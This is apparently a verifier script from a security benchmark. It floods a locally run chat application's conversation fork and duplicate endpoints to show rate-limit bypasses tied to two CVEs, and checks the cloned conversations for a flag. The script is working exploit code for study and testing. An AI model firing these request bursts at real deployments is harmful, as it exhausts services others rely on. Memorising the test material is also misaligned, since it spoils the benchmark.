#!/usr/bin/env bash
# verify.sh --seed|--residual
# seed     CVE-2025-7105: flood POST /api/convos/fork
#          V0 0.7.8 no limiter -> 200 clones with FLAG title
#          V1 0.7.9 forkUserLimiter FORK_USER_MAX=3 -> 429
# residual CVE-2026-54037: flood POST /api/convos/duplicate (inline)
#          V1 still unthrottled -> 201 clones with FLAG title
# Probe embeds RUN_FLAG in the source convo title; judge uses RUN_FLAG_REF
# so wrong/stale overrides fail. Remaining capacity (201/200 vs 429) AND
# flag in the cloned convo are both required — not just "got 429".
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
JUDGE="${RUN_FLAG_REF:-$RUN_FLAG}"
mkdir -p "$WORK_DIR"

SVC="$VERSION"
PORT=""
for _ in $(seq 1 40); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    port "$SVC" 3080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -n "$PORT" ]]; then
    code="$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${PORT}/" || true)"
    if [[ "$code" =~ ^[1-5][0-9][0-9]$ ]]; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published $SVC:3080" >&2; exit 20; }
BASE="http://127.0.0.1:${PORT}"

"$PY" - "$BASE" "$MODE" "$VERSION" "$RUN_FLAG" "$JUDGE" <<'PYEOF'
import hashlib
import json
import sys
import time
import urllib.error
import urllib.request
import uuid

BASE, MODE, VERSION, FLAG, JUDGE = sys.argv[1:6]
BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)
PASS = "PcbPass123!"
BURST = 8
FORK_USER_MAX = 3


def http(method, url, data=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, str(e).encode()


def json_headers(extra=None):
    h = {"Content-Type": "application/json", "Accept": "application/json", "User-Agent": BROWSER_UA}
    if extra:
        h.update(extra)
    return h


def multipart(files, fields=None):
    boundary = "----pcb" + uuid.uuid4().hex
    chunks = []
    for name, value in (fields or []):
        chunks.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode()
        )
    for name, filename, blob, ctype in files:
        chunks.append(
            (
                f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"; "
                f"filename=\"{filename}\"\r\nContent-Type: {ctype}\r\n\r\n"
            ).encode()
            + blob
            + b"\r\n"
        )
    chunks.append(f"--{boundary}--\r\n".encode())
    return b"".join(chunks), boundary


def decode(raw):
    return raw.decode("utf-8", "replace") if isinstance(raw, (bytes, bytearray)) else str(raw)


def ensure_user():
    slug = hashlib.sha256(FLAG.encode()).hexdigest()[:12]
    email = f"u{slug}@pcb.local"
    name = f"pcb_{slug}"
    st, body = -1, b""
    for _ in range(8):
        http(
            "POST",
            f"{BASE}/api/auth/register",
            data=json.dumps({
                "name": name,
                "email": email,
                "password": PASS,
                "confirm_password": PASS,
            }).encode(),
            headers=json_headers(),
            timeout=20,
        )
        st, body = http(
            "POST",
            f"{BASE}/api/auth/login",
            data=json.dumps({"email": email, "password": PASS}).encode(),
            headers=json_headers(),
            timeout=20,
        )
        try:
            tok = json.loads(body).get("token")
        except Exception:
            tok = None
        if tok:
            return tok
        time.sleep(3)
    print(f"verify: login failed status={st} body={decode(body)[:240]!r}", file=sys.stderr)
    sys.exit(20)


def make_import(flag):
    cid = str(uuid.uuid4())
    mid = str(uuid.uuid4())
    data = {
        "conversationId": cid,
        "endpoint": "openAI",
        "title": flag,
        "exportAt": "20:33:31 GMT-0400 (Eastern Daylight Time)",
        "branches": False,
        "recursive": False,
        "messages": [{
            "messageId": mid,
            "conversationId": cid,
            "createdAt": "2024-05-29T00:33:03.661Z",
            "endpoint": "openAI",
            "error": False,
            "isCreatedByUser": True,
            "isEdited": False,
            "model": None,
            "parentMessageId": None,
            "sender": "user",
            "text": flag,
            "unfinished": False,
            "updatedAt": "2024-05-29T00:33:03.661Z",
        }],
    }
    return json.dumps(data).encode(), cid


def list_convos(auth):
    st, raw = http("GET", f"{BASE}/api/convos?limit=100", headers=auth, timeout=30)
    text = decode(raw)
    try:
        payload = json.loads(raw)
    except Exception:
        payload = {}
    convos = payload.get("conversations") or payload.get("data") or []
    if isinstance(payload, list):
        convos = payload
    return st, text, convos if isinstance(convos, list) else []


def create_source(auth, flag):
    blob, _wanted = make_import(flag)
    body, boundary = multipart([("file", f"{flag}.json", blob, "application/json")])
    st, raw = http(
        "POST",
        f"{BASE}/api/convos/import",
        data=body,
        headers={**auth, "Content-Type": f"multipart/form-data; boundary={boundary}"},
        timeout=60,
    )
    print(f"verify: import_status={st} body={decode(raw)[:180].replace(chr(10), ' ')}")
    # importConversations swallows errors and still 201s — confirm via list.
    for _ in range(8):
        cst, ctext, convos = list_convos(auth)
        for c in convos:
            title = str(c.get("title") or "")
            cid = c.get("conversationId") or c.get("id")
            if cid and flag in title:
                return cid, ctext
        # fallback: POST /api/convos/update creates the row even without messages
        cid = str(uuid.uuid4())
        http(
            "POST",
            f"{BASE}/api/convos/update",
            data=json.dumps({
                "arg": {
                    "conversationId": cid,
                    "title": flag,
                    "endpoint": "openAI",
                }
            }).encode(),
            headers={**auth, "Content-Type": "application/json"},
            timeout=20,
        )
        time.sleep(1)
    print("verify: failed to create source conversation", file=sys.stderr)
    sys.exit(20)


def first_message_id(auth, cid):
    st, raw = http("GET", f"{BASE}/api/messages/{cid}", headers=auth, timeout=20)
    text = decode(raw)
    try:
        payload = json.loads(raw)
    except Exception:
        payload = None
    msgs = payload if isinstance(payload, list) else (payload or {}).get("messages") or []
    if isinstance(msgs, list) and msgs:
        mid = msgs[0].get("messageId") or msgs[0].get("id")
        if mid:
            return mid, text
    return None, text


token = ensure_user()
auth = {"Authorization": f"Bearer {token}", "User-Agent": BROWSER_UA, "Accept": "application/json"}
src_id, _ = create_source(auth, FLAG)
mid, _ = first_message_id(auth, src_id)
print(f"verify: source_convo={src_id} messageId={mid}")

if MODE == "--seed":
    path = "/api/convos/fork"
    payload = {"conversationId": src_id, "option": "targetLevel"}
    if mid:
        payload["messageId"] = mid
else:
    # residual: CVE-2026-54037 — /api/convos/duplicate missed the 0.7.9 limiter
    path = "/api/convos/duplicate"
    payload = {"conversationId": src_id, "title": FLAG}

statuses = {}
n429 = 0
n_ok = 0
channel = []
for i in range(BURST):
    st, raw = http(
        "POST",
        f"{BASE}{path}",
        data=json.dumps(payload).encode(),
        headers={**auth, "Content-Type": "application/json"},
        timeout=60,
    )
    text = decode(raw)
    statuses[st] = statuses.get(st, 0) + 1
    if st == 429:
        n429 += 1
    if st in (200, 201) and JUDGE and JUDGE in text:
        # cloned convo body must carry the flag (title inherited / set)
        try:
            obj = json.loads(raw)
        except Exception:
            obj = {}
        convo = obj.get("conversation") if isinstance(obj, dict) else None
        new_id = None
        if isinstance(convo, dict):
            new_id = convo.get("conversationId") or convo.get("id")
        if not new_id and isinstance(obj, dict):
            new_id = obj.get("conversationId") or obj.get("id")
        if new_id and new_id != src_id:
            n_ok += 1
            channel.append(text)
        elif JUDGE in text and new_id != src_id:
            n_ok += 1
            channel.append(text)
    time.sleep(0.05)

cst, ctext, convos = list_convos(auth)
flag_convos = 0
clone_titles = 0
for c in convos:
    title = str(c.get("title") or "")
    cid = c.get("conversationId") or c.get("id")
    if JUDGE and JUDGE in title:
        flag_convos += 1
        if cid and cid != src_id:
            clone_titles += 1
            channel.append(title)

print(
    f"verify: mode={MODE} path={path} burst={BURST} statuses={statuses} "
    f"n429={n429} n_ok={n_ok} flag_convos={flag_convos} clone_titles={clone_titles} "
    f"list_status={cst}"
)
print(f"verify: convos_sample={ctext[:280].replace(chr(10), ' ')}")

# Remaining capacity: unlimited clone work (0x 429 and more successes than the
# v1 user cap). Plus the judge token must appear in a CLONED conversation.
cloned = max(n_ok, clone_titles)
unlimited = n429 == 0 and cloned >= (FORK_USER_MAX + 1)
flag_in_clone = bool(JUDGE) and cloned >= 1
if unlimited and flag_in_clone:
    sys.exit(0)
print(
    f"verify: effect_not_observed unlimited={unlimited} flag_in_clone={flag_in_clone}",
    file=sys.stderr,
)
sys.exit(10)
PYEOF
